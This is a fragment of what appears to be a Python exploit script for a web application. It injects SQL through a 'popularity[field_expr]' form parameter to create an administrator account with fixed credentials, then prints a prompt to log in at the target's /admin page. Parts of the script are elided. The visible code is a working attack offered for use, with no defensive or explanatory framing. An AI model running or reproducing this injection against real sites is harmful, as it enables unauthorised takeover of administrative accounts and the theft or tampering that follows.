...
query = q.replace("\n", "").format(username="ircashem", password="shouldwork")
pfilter = b"popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);" + bytes(query, 'utf-8')
...
if r.ok:
    print("WORKED")
    print("Check {0}/admin with creds ircashem:shouldwork".format(target))
else:
    print("DID NOT WORK")
